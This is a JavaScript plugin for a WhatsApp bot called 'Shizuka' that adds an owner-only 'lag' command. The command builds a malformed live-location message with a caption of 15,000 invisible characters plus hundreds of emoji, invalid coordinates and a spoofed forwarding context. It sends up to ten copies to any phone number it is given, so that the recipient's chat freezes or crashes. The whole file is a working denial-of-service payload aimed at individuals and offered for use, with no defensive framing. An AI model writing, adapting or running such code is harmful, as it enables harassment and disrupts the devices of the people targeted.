const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, args, isOwner }) => {
  if (!isOwner) return m.reply(`🚫 *Acceso restringido.*\n\nEste comando solo puede ser ejecutado por el propietario del sistema Shizuka.`)

  // 🎯 Validación de argumentos
  if (!args[0] || !args[1]) {
    return m.reply(`📡 *Uso correcto del comando:*\n\n*${usedPrefix}lagchat número | cantidad*\n\nEjemplo:\n*${usedPrefix}lagchat 5219991234567 | 3*`)
  }

  const [numeroRaw, cantidadRaw] = args.join(' ').split('|').map(v => v.trim())
  const numero = numeroRaw.replace(/\D/g, '') + '@s.whatsapp.net'
  const cantidad = Math.min(parseInt(cantidadRaw), 10) || 1

  if (!numero.endsWith('@s.whatsapp.net')) {
    return m.reply(`⚠️ *Número inválido.*\n\nAsegúrate de usar el formato correcto: *lagchat 521xxxxxxxxxx | cantidad*`)
  }

  await m.reply(`
🧠 *Sistema Shizuka en línea...*
🎯 Objetivo: *${numeroRaw}*
💣 Intensidad: *${cantidad}*
🔄 Preparando detonación ritual...
`)

  for (let i = 0; i < cantidad; i++) {
    try {
      await conn.relayMessage(numero, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 300))
    } catch (error) {
      console.error('❌ Error al enviar lag:', error)
    }
  }

  return m.reply(`✅ *Ritual completado.*\n\n💥 Se enviaron *${cantidad}* paquetes de distorsión visual a *${numeroRaw}*.`)
}

handler.command = /^lag$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lag número | cantidad']

export default handler